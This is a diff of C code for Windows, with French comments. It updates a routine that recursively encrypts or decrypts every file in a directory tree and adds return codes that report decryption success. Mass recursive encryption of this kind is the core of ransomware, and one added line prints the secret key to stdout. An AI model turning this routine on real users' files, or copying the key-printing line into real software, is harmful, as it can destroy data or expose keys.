@@ -66,10 +66,13 @@ void construct_path(const char *directory, const char *file, char *full_path, si
  * @param mode Mode d'opération : 0 pour chiffrer, 1 pour déchiffrer.
  * @param key Clé de chiffrement/déchiffrement (doit être de taille KEY_SIZE).
  * @param iv Vecteur d'initialisation (doit être de taille IV_SIZE).
+ * @return Si déchiffrement, retourne 0 si au moins un fichier a été déchiffré avec succès, -2 sinon.
+           Si chiffrement, retourne 0 quoi qu'il arrive
  */
-void read_and_crypt_directory(const char *dir_path, int mode, unsigned char *key, unsigned char *iv) {
+int  read_and_crypt_directory(const char *dir_path, int mode, unsigned char *key, unsigned char *iv) {
     WIN32_FIND_DATA find_file_data;
-    HANDLE hFind;
+    HANDLE hFind; 
+    int decryption_success = -2;  // Initialisation à -2 (aucun déchiffrement réussi)
 
     // Construction du chemin de recherche 
     char search_path[1024];
@@ -81,9 +84,9 @@ void read_and_crypt_directory(const char *dir_path, int mode, unsigned char *key
     // Si l'ouverture du répertoire échoue, nous affichons une erreur
     if (hFind == INVALID_HANDLE_VALUE) {
         perror("FindFirstFile a échoué.");
-        return;
+        return -1;
     }
-
+    
     // Nous parcourons le contenu du répertoire
     do {
         // Nous ignorons les répertoires "." et ".."
@@ -102,22 +105,33 @@ void read_and_crypt_directory(const char *dir_path, int mode, unsigned char *key
 
             // Si le mode est 0, on chiffre le fichier
             if (mode == 0) {
-                encrypt_file(full_path, key, iv);
+                encrypt_file(full_path, key, iv); 
             }
             // Si le mode est 1, on déchiffre le fichier
             else if (mode == 1) {
-                decrypt_file(full_path, key, iv);
+                int result = decrypt_file(full_path, key, iv);
+                if (result == 0) {
+                    decryption_success = 0;  // Au moins un déchiffrement a réussi
+                }
             }
         }
         // Si c'est un répertoire, appeler récursivement read_and_crypt_directory pour explorer le sous-répertoire
         else if (is_directory(full_path)) {
             // Appel récursif pour les sous-répertoires
-            read_and_crypt_directory(full_path, mode, key, iv); 
+            int result = read_and_crypt_directory(full_path, mode, key, iv);
+            if (result == 0) {
+                decryption_success = 0;  // Propagation du succès de déchiffrement
+            }
         }
     } while (FindNextFile(hFind, &find_file_data) != 0);
 
     // Ferme le répertoire
     FindClose(hFind);
+    // Si chiffrement, on renvoie 0 quoi quil arrive
+    if (mode == 0) {
+        decryption_success = 0;
+    }
+    return decryption_success;
 }
 
 /**
@@ -267,7 +281,7 @@ int encrypt_file(const char *input_path, unsigned char *key, unsigned char *iv) 
  * @param input_path Chemin du fichier à déchiffrer.
  * @param key Clé de déchiffrement (doit être de taille KEY_SIZE).
  * @param iv Vecteur d'initialisation (doit être de taille IV_SIZE).
- * @return 0 en cas de succès, -1 en cas d'erreur, -2 si la clé ou l'IV est incorrect.
+ * @return 0 en cas de succès, -1 en cas d'erreur, -2 si la clé ou l'IV est incorrect, -3 si le fichier n'est pas chiffré.
  */
 int decrypt_file(const char *input_path, unsigned char *key, unsigned char *iv) {
     FILE *infile = fopen(input_path, "rb");
@@ -275,6 +289,7 @@ int decrypt_file(const char *input_path, unsigned char *key, unsigned char *iv) 
         perror("Erreur lors de l'ouverture du fichier d'entrée");
         return -1;
     }
+    printf("cle: %s\n", key);
 
     // Préparation du fichier de sortie
     char output_path[1024];
@@ -285,7 +300,7 @@ int decrypt_file(const char *input_path, unsigned char *key, unsigned char *iv) 
     } else {
         printf("Fichier non chiffré, ignoré avec succès : %s\n", input_path);
         fclose(infile);
-        return 0;
+        return -3;
     }
 
     // Initialisation du contexte de déchiffrement
